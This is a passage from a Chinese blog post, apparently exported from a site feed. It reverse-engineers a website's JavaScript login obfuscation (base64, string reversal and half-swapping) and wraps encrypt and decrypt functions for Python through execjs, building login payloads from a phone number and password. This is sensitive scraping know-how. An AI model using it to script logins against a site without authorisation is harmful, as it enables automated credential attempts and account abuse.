function_">indexOf</span>(e.<span class="title function_">charAt</span>(c++)),</span><br><span class="line">        l = r.<span class="title function_">indexOf</span>(e.<span class="title function_">charAt</span>(c++)),</span><br><span class="line">        b = r.<span class="title function_">indexOf</span>(e.<span class="title function_">charAt</span>(c++)),</span><br><span class="line">        s = r.<span class="title function_">indexOf</span>(e.<span class="title function_">charAt</span>(c++)),</span><br><span class="line">        o = n &lt;&lt; <span class="number">2</span> | l &gt;&gt; <span class="number">4</span>,</span><br><span class="line">        i = (<span class="number">15</span> &amp; l) &lt;&lt; <span class="number">4</span> | b &gt;&gt; <span class="number">2</span>,</span><br><span class="line">        a = (<span class="number">3</span> &amp; b) &lt;&lt; <span class="number">6</span> | s,</span><br><span class="line">        t += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(o),</span><br><span class="line">        <span class="number">64</span> != b &amp;&amp; (t += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(i)),</span><br><span class="line">        <span class="number">64</span> != s &amp;&amp; (t += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(a));</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> t = e.<span class="title function_">split</span>(<span class="string">&quot;&quot;</span>).<span class="title function_">map</span>((<span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> e.<span class="title function_">charCodeAt</span>(<span class="number">0</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        )), o = <span class="string">&quot;&quot;</span>, i = <span class="number">0</span>; i &lt; t.<span class="property">length</span>; i++)</span><br><span class="line">            o += <span class="string">&quot;%&quot;</span> + t[i].<span class="title function_">toString</span>(<span class="number">16</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">decodeURIComponent</span>(o)</span><br><span class="line">    &#125;(t)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> a = <span class="string">&quot;kVmcv52ZJtlI6ICZJV2YhJHdiwiIv+K6ZSZ6BC65G+a5Wio53+Y56yp5Lmo5iojInNXTlNnbvB3clJnIsIyMxATMyIiOiUGZvNUZz52bwNXZyJye9xGb15mOic2cNJ3byJXZiwCbsVnb6ISY0FGZiwiI5EDMlRDO1cjMwMjN4AjYiBDZkRjM5UWM0YjNlNWNjNjI6ICZJR3clVXclJnIsISXlNWYyRFI&quot;</span></span><br><span class="line"><span class="keyword">var</span> o = <span class="title function_">u</span>(a)</span><br><span class="line">o = <span class="title function_">decrypt</span>(o.<span class="title function_">split</span>(<span class="string">&quot;&quot;</span>).<span class="title function_">reverse</span>().<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>))</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o)</span><br></pre></td></tr></table></figure>

<p>执行得到结果</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;responseCode&quot;</span>:<span class="string">&quot;21013&quot;</span>,<span class="string">&quot;responseMsg&quot;</span>:<span class="string">&quot;手机号或密码错误&quot;</span>,<span class="string">&quot;traceId&quot;</span>:<span class="string">&quot;[Ignored Trace]&quot;</span>,<span class="string">&quot;requestId&quot;</span>:<span class="string">&quot;3c5ce6641e924dd0bb0863027584e019&quot;</span>,<span class="string">&quot;data&quot;</span>:<span class="literal">null</span>,<span class="string">&quot;errorMsg&quot;</span>:<span class="literal">null</span>&#125;</span><br></pre></td></tr></table></figure>

<h1 id="3-成品"><a href="#3-成品" class="headerlink" title="3.成品"></a>3.成品</h1><p>把加解密合并一下,再稍微修改一下,方便python调用</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> r = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">encrypt</span>(<span class="params">e</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> t = <span class="string">&quot;&quot;</span></span><br><span class="line">      , o = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , i = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , a = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , n = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , l = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , b = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , s = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , c = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (e = <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> t = <span class="built_in">encodeURIComponent</span>(e), o = [], i = <span class="number">0</span>; i &lt; t.<span class="property">length</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">var</span> r = t.<span class="title function_">charAt</span>(i);</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&quot;%&quot;</span> === r) &#123;</span><br><span class="line">                <span class="keyword">var</span> a = t.<span class="title function_">charAt</span>(i + <span class="number">1</span>) + t.<span class="title function_">charAt</span>(i + <span class="number">2</span>)</span><br><span class="line">                  , n = <span class="built_in">parseInt</span>(a, <span class="number">16</span>);</span><br><span class="line">                o.<span class="title function_">push</span>(n),</span><br><span class="line">                i += <span class="number">2</span></span><br><span class="line">            &#125; <span class="keyword">else</span></span><br><span class="line">                o.<span class="title function_">push</span>(r.<span class="title function_">charCodeAt</span>(<span class="number">0</span>))</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> o.<span class="title function_">map</span>((<span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(e)</span><br><span class="line">        &#125;</span><br><span class="line">        )).<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    &#125;(e); c &lt; e.<span class="property">length</span>; )</span><br><span class="line">        o = e.<span class="title function_">charCodeAt</span>(c++),</span><br><span class="line">        i = e.<span class="title function_">charCodeAt</span>(c++),</span><br><span class="line">        a = e.<span class="title function_">charCodeAt</span>(c++),</span><br><span class="line">        n = o &gt;&gt; <span class="number">2</span>,</span><br><span class="line">        l = (<span class="number">3</span> &amp; o) &lt;&lt; <span class="number">4</span> | i &gt;&gt; <span class="number">4</span>,</span><br><span class="line">        b = (<span class="number">15</span> &amp; i) &lt;&lt; <span class="number">2</span> | a &gt;&gt; <span class="number">6</span>,</span><br><span class="line">        s = <span class="number">63</span> &amp; a,</span><br><span class="line">        <span class="built_in">isNaN</span>(i) ? b = s = <span class="number">64</span> : <span class="built_in">isNaN</span>(a) &amp;&amp; (s = <span class="number">64</span>),</span><br><span class="line">        t = t + r.<span class="title function_">charAt</span>(n) + r.<span class="title function_">charAt</span>(l) + r.<span class="title function_">charAt</span>(b) + r.<span class="title function_">charAt</span>(s);</span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> t = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , o = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , i = <span class="string">&quot;&quot;</span></span><br><span class="line">      , r = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> e.<span class="property">length</span> % <span class="number">2</span> ? (r = (e.<span class="property">length</span> + <span class="number">1</span>) / <span class="number">2</span>,</span><br><span class="line">    t = e.<span class="title function_">substring</span>(<span class="number">1</span>, r),</span><br><span class="line">    o = e.<span class="title function_">substring</span>(r),</span><br><span class="line">    i = e.<span class="title function_">substring</span>(<span class="number">0</span>, <span class="number">1</span>) + o + t) : (r = e.<span class="property">length</span> / <span class="number">2</span>,</span><br><span class="line">    t = e.<span class="title function_">substring</span>(<span class="number">0</span>, r),</span><br><span class="line">    i = (o = e.<span class="title function_">substring</span>(r)) + t),</span><br><span class="line">    i</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">decrypt</span>(<span class="params">e</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> t = <span class="string">&quot;&quot;</span></span><br><span class="line">      , o = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , i = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , a = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , n = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , l = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , b = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , s = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , c = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (e = e.<span class="title function_">replace</span>(<span class="regexp">/[^A-Za-z0-9+/=]/g</span>, <span class="string">&quot;&quot;</span>); c &lt; e.<span class="property">length</span>; )</span><br><span class="line">        n = r.<span class="title function_">indexOf</span>(e.<span class="title function_">charAt</span>(c++)),</span><br><span class="line">        l = r.<span class="title function_">indexOf</span>(e.<span class="title function_">charAt</span>(c++)),</span><br><span class="line">        b = r.<span class="title function_">indexOf</span>(e.<span class="title function_">charAt</span>(c++)),</span><br><span class="line">        s = r.<span class="title function_">indexOf</span>(e.<span class="title function_">charAt</span>(c++)),</span><br><span class="line">        o = n &lt;&lt; <span class="number">2</span> | l &gt;&gt; <span class="number">4</span>,</span><br><span class="line">        i = (<span class="number">15</span> &amp; l) &lt;&lt; <span class="number">4</span> | b &gt;&gt; <span class="number">2</span>,</span><br><span class="line">        a = (<span class="number">3</span> &amp; b) &lt;&lt; <span class="number">6</span> | s,</span><br><span class="line">        t += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(o),</span><br><span class="line">        <span class="number">64</span> != b &amp;&amp; (t += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(i)),</span><br><span class="line">        <span class="number">64</span> != s &amp;&amp; (t += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(a));</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> t = e.<span class="title function_">split</span>(<span class="string">&quot;&quot;</span>).<span class="title function_">map</span>((<span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> e.<span class="title function_">charCodeAt</span>(<span class="number">0</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        )), o = <span class="string">&quot;&quot;</span>, i = <span class="number">0</span>; i &lt; t.<span class="property">length</span>; i++)</span><br><span class="line">            o += <span class="string">&quot;%&quot;</span> + t[i].<span class="title function_">toString</span>(<span class="number">16</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">decodeURIComponent</span>(o)</span><br><span class="line">    &#125;(t)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">pyencrypt</span>(<span class="params">mobile,password</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> e = <span class="string">&#x27;&#123;&quot;mobile&quot;:&quot;&#x27;</span>+mobile+<span class="string">&#x27;&quot;,&quot;password&quot;:&quot;&#x27;</span>+password+<span class="string">&#x27;&quot;,&quot;zoneCode&quot;:&quot;86&quot;,&quot;captchaId&quot;:&quot;&quot;,&quot;verificationCode&quot;:&quot;&quot;&#125;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">u</span>(t = <span class="title function_">encrypt</span>(e).<span class="title function_">split</span>(<span class="string">&quot;&quot;</span>).<span class="title function_">reverse</span>().<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>))</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">pydecrypt</span>(<span class="params">a</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">decrypt</span>(<span class="title function_">u</span>(a).<span class="title function_">split</span>(<span class="string">&quot;&quot;</span>).<span class="title function_">reverse</span>().<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>python脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> execjs</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">mobile,password</span>):</span><br><span class="line">    path = <span class="string">r&#x27;test.js&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        JsData = f.read()</span><br><span class="line">    encrypt = execjs.<span class="built_in">compile</span>(JsData).call(<span class="string">&#x27;pyencrypt&#x27;</span>,mobile,password)</span><br><span class="line">    <span class="keyword">return</span> encrypt</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">string</span>):</span><br><span class="line">    path = <span class="string">r&#x27;test.js&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        JsData = f.read()</span><br><span class="line">    decrypt = execjs.<span class="built_in">compile</span>(JsData).call(<span class="string">&#x27;pydecrypt&#x27;</span>,string)</span><br><span class="line">    <span class="keyword">return</span> decrypt</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>加密</tag>
        <tag>js</tag>
      </tags>
  </entry>
</search>
